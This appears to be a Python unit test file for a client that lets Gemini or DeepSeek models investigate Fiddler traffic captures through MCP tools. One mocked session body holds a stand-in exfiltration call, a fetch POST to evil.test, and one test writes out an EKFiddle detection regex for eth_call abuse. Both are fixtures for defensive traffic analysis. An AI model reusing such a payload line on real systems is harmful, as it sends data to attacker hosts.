#!/usr/bin/env python3
"""Unit tests for DeepSeek OpenAI-compatible native tool provider and client wiring."""
from __future__ import annotations

import importlib.util
import json
import os
import sys
import types
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)


def _load_module(name: str, filename: str):
    path = os.path.join(ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    assert spec.loader is not None
    sys.modules[name] = mod
    spec.loader.exec_module(mod)
    return mod


# Stub google.generativeai so gemini-fiddler-client imports cleanly without API keys
if "google" not in sys.modules:
    google_mod = types.ModuleType("google")
    sys.modules["google"] = google_mod
else:
    google_mod = sys.modules["google"]

genai_mod = types.ModuleType("google.generativeai")
genai_mod.configure = MagicMock()
genai_mod.GenerativeModel = MagicMock()
google_mod.generativeai = genai_mod
sys.modules["google.generativeai"] = genai_mod
types_mod = types.ModuleType("google.generativeai.types")


class _FakeFD:
    def __init__(self, name, description, parameters):
        self.name = name
        self.description = description
        self.parameters = parameters


class _FakeTool:
    def __init__(self, function_declarations):
        self.function_declarations = function_declarations


types_mod.FunctionDeclaration = _FakeFD
types_mod.Tool = _FakeTool
sys.modules["google.generativeai.types"] = types_mod
protos_mod = types.ModuleType("google.generativeai.protos")
protos_mod.Content = MagicMock()
protos_mod.Part = MagicMock()
sys.modules["google.generativeai.protos"] = protos_mod
genai_mod.protos = protos_mod
genai_mod.types = types_mod

gemini = _load_module("gemini_client_ds_mod", "gemini-fiddler-client.py")

ALL_TEN_TOOLS = [
    {
        "name": "fiddler_mcp__live_sessions",
        "description": "List live sessions",
        "inputSchema": {
            "type": "object",
            "properties": {
                "limit": {"type": "integer"},
                "host_filter": {"type": "string"},
                "suspicious_only": {"type": "boolean"},
            },
        },
    },
    {
        "name": "fiddler_mcp__sessions_search",
        "description": "Search sessions",
        "inputSchema": {
            "type": "object",
            "properties": {
                "host_pattern": {"type": "string"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE"]},
                "limit": {"type": "integer"},
            },
        },
    },
    {
        "name": "fiddler_mcp__session_headers",
        "description": "Session headers",
        "inputSchema": {
            "type": "object",
            "properties": {"session_id": {"type": "string"}},
            "required": ["session_id"],
        },
    },
    {
        "name": "fiddler_mcp__session_body",
        "description": "Session body",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_id": {"type": "string"},
                "smart_extract": {"type": "boolean"},
            },
            "required": ["session_id"],
        },
    },
    {
        "name": "fiddler_mcp__compare_sessions",
        "description": "Compare sessions",
        "inputSchema": {
            "type": "object",
            "properties": {
                "session_ids": {"type": "array", "items": {"type": "string"}},
            },
            "required": ["session_ids"],
        },
    },
    {
        "name": "fiddler_mcp__live_stats",
        "description": "Bridge stats",
        "inputSchema": {"type": "object", "properties": {}},
    },
    {
        "name": "fiddler_mcp__sessions_timeline",
        "description": "Timeline",
        "inputSchema": {
            "type": "object",
            "properties": {
                "group_by": {"type": "string", "enum": ["minute", "host", "status"]},
            },
        },
    },
    {
        "name": "fiddler_mcp__sessions_clear",
        "description": "Clear buffer",
        "inputSchema": {
            "type": "object",
            "properties": {"confirm": {"type": "boolean"}},
            "required": ["confirm"],
        },
    },
    {
        "name": "fiddler_mcp__ekfiddle_sessions",
        "description": "EKFiddle sessions",
        "inputSchema": {
            "type": "object",
            "properties": {
                "threat_level": {"type": "string", "enum": ["all", "critical", "high", "medium", "low"]},
            },
        },
    },
    {
        "name": "fiddler_mcp__ekfiddle_threats",
        "description": "EKFiddle threats",
        "inputSchema": {
            "type": "object",
            "properties": {
                "min_risk_score": {"type": "number"},
                "time_range_minutes": {"type": "integer"},
            },
        },
    },
]


class TestOpenAIToolSchema(unittest.TestCase):
    def test_all_ten_tools_convert(self):
        from llm_tool_schema import mcp_tools_to_openai_tools

        tools = mcp_tools_to_openai_tools(ALL_TEN_TOOLS)
        self.assertEqual(len(tools), 10)
        names = {t["function"]["name"] for t in tools}
        for expected in ALL_TEN_TOOLS:
            self.assertIn(expected["name"], names)
        body = next(t for t in tools if t["function"]["name"] == "fiddler_mcp__session_body")
        self.assertEqual(body["type"], "function")
        self.assertIn("session_id", body["function"]["parameters"]["required"])
        search = next(t for t in tools if t["function"]["name"] == "fiddler_mcp__sessions_search")
        method = search["function"]["parameters"]["properties"]["method"]
        self.assertEqual(method.get("enum"), ["GET", "POST", "PUT", "DELETE"])


class TestDeepSeekProviderParse(unittest.TestCase):
    def test_extract_tool_calls_json_string_args(self):
        with patch("openai.OpenAI") as OpenAI:
            OpenAI.return_value = MagicMock()
            from llm_providers.deepseek_provider import DeepSeekProvider

            provider = DeepSeekProvider(api_key="sk-test", model_name="deepseek-v4-flash")
            fn = types.SimpleNamespace(
                name="fiddler_mcp__ekfiddle_threats",
                arguments='{"min_risk_score": 0.7, "time_range_minutes": 60}',
            )
            tc = types.SimpleNamespace(id="call_abc", function=fn)
            msg = types.SimpleNamespace(tool_calls=[tc], content=None)
            resp = types.SimpleNamespace(choices=[types.SimpleNamespace(message=msg)])
            calls = provider.extract_tool_calls(resp)
            self.assertEqual(len(calls), 1)
            self.assertEqual(calls[0]["name"], "fiddler_mcp__ekfiddle_threats")
            self.assertEqual(calls[0]["args"]["min_risk_score"], 0.7)
            self.assertEqual(calls[0]["id"], "call_abc")

    def test_tool_choice_none_omits_tools(self):
        with patch("openai.OpenAI") as OpenAI:
            client = MagicMock()
            OpenAI.return_value = client
            from llm_providers.deepseek_provider import DeepSeekProvider

            provider = DeepSeekProvider(api_key="sk-test")
            provider.bind_tools(ALL_TEN_TOOLS, "sys")
            provider.generate([{"role": "user", "content": "hi"}], tool_choice="none")
            kwargs = client.chat.completions.create.call_args.kwargs
            self.assertNotIn("tools", kwargs)
            provider.generate([{"role": "user", "content": "hi"}], tool_choice="auto")
            kwargs2 = client.chat.completions.create.call_args.kwargs
            self.assertIn("tools", kwargs2)
            self.assertEqual(len(kwargs2["tools"]), 10)


class TestDeepSeekNativeLoop(unittest.TestCase):
    def _make_client(self, max_followups=5):
        client = gemini.GeminiFiddlerClient.__new__(gemini.GeminiFiddlerClient)
        client.use_native_tools = True
        client._gemini_tool = True
        client.provider_name = "deepseek"
        client.max_followups = max_followups
        client.show_progress = False
        client.conversation_history = []
        client._analyzed_session_ids = set()
        client._last_search_args = {}
        client._current_user_query = "investigate"
        client._interrupt_requested = False
        client.use_rich = False
        client.console = None
        client.log_with_timestamp = MagicMock()
        client.clear_interrupt = MagicMock()
        client._check_interrupt = MagicMock()
        client._format_recent_history = MagicMock(return_value="")
        client._analyzed_sessions_note = MagicMock(return_value="No sessions")
        client.maybe_persist_ekfiddle_rules = MagicMock(return_value=[])
        client._finalize_assistant_response = lambda t: t
        client.parse_gemini_response = MagicMock(return_value=None)
        return client

    def test_sequential_and_budget_synthesis(self):
        client = self._make_client(max_followups=1)
        order = []

        def fake_call(name, args):
            order.append(name)
            return {"success": True, "tool": name}

        client.call_tool = fake_call
        tool_choices = []

        class FakeDeepSeek:
            display_label = "DeepSeek"

            def tools_bound(self):
                return True

            def start_conversation(self, user_text):
                return [{"role": "system", "content": "sys"}, {"role": "user", "content": user_text}]

            def generate(self, conversation, tool_choice="auto"):
                tool_choices.append(tool_choice)
                return self._queue.pop(0)

            def extract_tool_calls(self, response):
                return list(response.get("calls") or [])

            def extract_text(self, response):
                return response.get("text") or ""

            def append_model_turn(self, conversation, response, calls, text):
                conversation.append({"role": "assistant"})

            def append_tool_results(self, conversation, executed, nudge):
                conversation.append({"role": "tool"})

            def append_user_text(self, conversation, text):
                conversation.append({"role": "user", "content": text})

        provider = FakeDeepSeek()
        provider._queue = [
            {
                "calls": [
                    {"name": "fiddler_mcp__ekfiddle_threats", "args": {}, "id": "1"},
                ],
                "text": "",
            },
            {"calls": [], "text": "final after budget"},
        ]
        client.llm_provider = provider
        out = client._chat_native("investigate buffer")
        self.assertEqual(order, ["fiddler_mcp__ekfiddle_threats"])
        self.assertIn("final after budget", out)
        self.assertEqual(tool_choices, ["auto", "none"])

    def test_investigate_e2e_mocked_tool_chain_and_ekfiddle_save(self):
        client = self._make_client(max_followups=5)
        order = []

        def fake_call(name, args):
            order.append(name)
            if name == "fiddler_mcp__ekfiddle_threats":
                return {"success": True, "threats": [{"session_id": "42", "risk_score": 0.95}]}
            if name == "fiddler_mcp__session_body":
                return {
                    "success": True,
                    "session_id": "42",
                    "body": "fetch('https://evil.test/x',{method:'POST'}); eth_call",
                }
            return {"success": True}

        client.call_tool = fake_call
        rule_line = (
            "SourceCode\tHigh: Evil Eth Call\t"
            "method\\s*:\\s*['\\\"]eth_call['\\\"]"
        )
        final_text = (
            "Infection chain: landing to RPC.\n"
            "The crucial pattern identifies eth_call JSON-RPC abuse.\n\n"
            f"{rule_line}\n"
        )
        client.maybe_persist_ekfiddle_rules = MagicMock(return_value=[rule_line])

        def finalize(text):
            client.maybe_persist_ekfiddle_rules(text)
            return text

        client._finalize_assistant_response = finalize

        class FakeDeepSeek:
            display_label = "DeepSeek"

            def tools_bound(self):
                return True

            def start_conversation(self, user_text):
                self.last_user = user_text
                return [{"role": "user", "content": user_text}]

            def generate(self, conversation, tool_choice="auto"):
                return self._queue.pop(0)

            def extract_tool_calls(self, response):
                return list(response.get("calls") or [])

            def extract_text(self, response):
                return response.get("text") or ""

            def append_model_turn(self, conversation, response, calls, text):
                conversation.append({"role": "assistant"})

            def append_tool_results(self, conversation, executed, nudge):
                conversation.append({"role": "tool"})

            def append_user_text(self, conversation, text):
                conversation.append({"role": "user", "content": text})

        provider = FakeDeepSeek()
        provider._queue = [
            {
                "calls": [
                    {"name": "fiddler_mcp__ekfiddle_threats", "args": {"min_risk_score": 0.7}, "id": "a"},
                ],
                "text": "",
            },
            {
                "calls": [
                    {"name": "fiddler_mcp__session_body", "args": {"session_id": "42"}, "id": "b"},
                ],
                "text": "",
            },
            {"calls": [], "text": final_text},
        ]
        client.llm_provider = provider
        prompt = gemini.GeminiFiddlerClient.build_investigate_prompt("evil.test")
        out = client._chat_native(prompt)
        self.assertEqual(
            order,
            ["fiddler_mcp__ekfiddle_threats", "fiddler_mcp__session_body"],
        )
        self.assertIn("Infection chain", out)
        client.maybe_persist_ekfiddle_rules.assert_called()
        saved_arg = client.maybe_persist_ekfiddle_rules.call_args[0][0]
        self.assertIn("SourceCode", saved_arg)
        self.assertIn("evil.test", prompt)


class TestProviderConfigAndModelResolution(unittest.TestCase):
    def test_provider_for_model(self):
        self.assertEqual(gemini.provider_for_model("gemini-3-flash-preview"), "gemini")
        self.assertEqual(gemini.provider_for_model("deepseek-v4-flash"), "deepseek")
        self.assertEqual(gemini.provider_for_model("deepseek-v4-pro"), "deepseek")

    def test_resolve_model_identifier(self):
        self.assertEqual(gemini.resolve_model_identifier("12"), "deepseek-v4-flash")
        self.assertEqual(gemini.resolve_model_identifier("13"), "deepseek-v4-pro")
        self.assertEqual(gemini.resolve_model_identifier("1"), "gemini-3-flash-preview")
        self.assertEqual(gemini.resolve_model_identifier("deepseek-v4-pro"), "deepseek-v4-pro")
        self.assertIsNone(gemini.resolve_model_identifier("nope"))

    def test_deepseek_init_requires_key(self):
        with self.assertRaises(RuntimeError):
            gemini.GeminiFiddlerClient(
                api_key="",
                model_name="deepseek-v4-flash",
                provider="deepseek",
                deepseek_api_key="",
            )

    def test_gemini_default_still_inits(self):
        client = gemini.GeminiFiddlerClient(api_key="gk-test", model_name="gemini-3-flash-preview")
        self.assertEqual(client.provider_name, "gemini")
        self.assertEqual(client.model_name, "gemini-3-flash-preview")

    def test_change_model_to_deepseek_without_key_fails(self):
        client = gemini.GeminiFiddlerClient(api_key="gk-test", model_name="gemini-3-flash-preview")
        client.deepseek_api_key = ""
        client.available_tools = ALL_TEN_TOOLS
        # Cancel at the prompt -> stay on Gemini
        with patch.object(client, "prompt_and_save_deepseek_api_key", return_value=False):
            client.change_model("deepseek-v4-flash")
        self.assertEqual(client.provider_name, "gemini")
        self.assertEqual(client.model_name, "gemini-3-flash-preview")

    def test_change_model_prompts_and_saves_deepseek_key(self):
        client = gemini.GeminiFiddlerClient(api_key="gk-test", model_name="gemini-3-flash-preview")
        client.deepseek_api_key = ""
        client.available_tools = ALL_TEN_TOOLS[:1]
        client.log_with_timestamp = MagicMock()

        def fake_prompt():
            client.deepseek_api_key = "sk-test-deepseek"
            return True

        with patch.object(client, "prompt_and_save_deepseek_api_key", side_effect=fake_prompt):
            with patch.object(gemini, "merge_save_config", return_value=Path("gemini-fiddler-config.json")):
                client.change_model("13")
        self.assertEqual(client.provider_name, "deepseek")
        self.assertEqual(client.model_name, "deepseek-v4-pro")
        self.assertEqual(client.deepseek_api_key, "sk-test-deepseek")

    def test_merge_save_config_writes_deepseek_key(self):
        import tempfile
        from pathlib import Path as P
        with tempfile.TemporaryDirectory() as td:
            cfg = P(td) / "gemini-fiddler-config.json"
            cfg.write_text(json.dumps({"api_key": "gk", "model": "gemini-3-flash-preview"}), encoding="utf-8")
            with patch.object(gemini, "config_file_path", return_value=cfg):
                out = gemini.merge_save_config({"deepseek_api_key": "sk-saved"})
            data = json.loads(out.read_text(encoding="utf-8"))
            self.assertEqual(data["api_key"], "gk")
            self.assertEqual(data["deepseek_api_key"], "sk-saved")

    def test_load_config_deepseek_env(self):
        with patch.dict(
            os.environ,
            {
                "DEEPSEEK_API_KEY": "sk-ds",
                "LLM_PROVIDER": "deepseek",
                "DEEPSEEK_MODEL": "deepseek-v4-pro",
            },
            clear=False,
        ):
            # Avoid gemini-fiddler-config.json if present
            with patch("pathlib.Path.exists", return_value=False):
                cfg = gemini.load_config()
        self.assertEqual(cfg.get("deepseek_api_key"), "sk-ds")
        self.assertEqual(cfg.get("provider"), "deepseek")
        self.assertEqual(cfg.get("model"), "deepseek-v4-pro")

    def test_investigate_prompt_unchanged_shape(self):
        prompt = gemini.GeminiFiddlerClient.build_investigate_prompt("host.example")
        self.assertIn("host.example", prompt)
        lowered = prompt.lower()
        self.assertTrue("investigate" in lowered or "malicious" in lowered)

    def test_deepseek_system_has_investigate_sections(self):
        import llm_prompts

        text = llm_prompts.investigation_system_instruction(20)
        self.assertIn("INVESTIGATE CAPTURE", text)
        self.assertIn("EKFIDDLE RULE AUTHORING", text)
        with patch("openai.OpenAI") as OpenAI:
            OpenAI.return_value = MagicMock()
            from llm_providers.deepseek_provider import DeepSeekProvider

            p = DeepSeekProvider(api_key="sk")
            ok = p.bind_tools(ALL_TEN_TOOLS, text)
            self.assertTrue(ok)
            messages = p.start_conversation("go")
            self.assertEqual(messages[0]["role"], "system")
            self.assertIn("INVESTIGATE CAPTURE", messages[0]["content"])
            self.assertIn("EKFIDDLE RULE AUTHORING", messages[0]["content"])

    def test_deepseek_forces_native_even_when_env_off(self):
        with patch.dict(os.environ, {"GEMINI_NATIVE_TOOLS": "0"}, clear=False):
            client = gemini.GeminiFiddlerClient(
                api_key="gk",
                provider="deepseek",
                deepseek_api_key="sk-ds",
                model_name="deepseek-v4-flash",
            )
        self.assertEqual(client.provider_name, "deepseek")
        self.assertTrue(client.use_native_tools)

    def test_deepseek_chat_unbound_returns_clear_error(self):
        client = gemini.GeminiFiddlerClient(
            api_key="gk",
            provider="deepseek",
            deepseek_api_key="sk-ds",
            model_name="deepseek-v4-flash",
        )
        client.available_tools = []
        client._gemini_tool = None
        client.conversation_history = []
        client.ensure_mcp_alive = MagicMock(return_value=True)
        client.clear_interrupt = MagicMock()
        client.log_with_timestamp = MagicMock()
        out = client.chat("show stats")
        self.assertIn("not bound", out.lower())
        # Must not attempt Gemini legacy generate_content
        self.assertIsNone(client.model)

    def test_roundtrip_model_switch_rebinds_tools(self):
        client = gemini.GeminiFiddlerClient(api_key="gk-test", model_name="gemini-3-flash-preview")
        client.deepseek_api_key = "sk-ds"
        client.available_tools = ALL_TEN_TOOLS[:1]
        client.log_with_timestamp = MagicMock()
        client.change_model("deepseek-v4-flash")
        self.assertEqual(client.provider_name, "deepseek")
        self.assertTrue(client.llm_provider.tools_bound())
        client.change_model("gemini-3-flash-preview")
        self.assertEqual(client.provider_name, "gemini")
        self.assertTrue(client._gemini_tool)


if __name__ == "__main__":
    unittest.main()
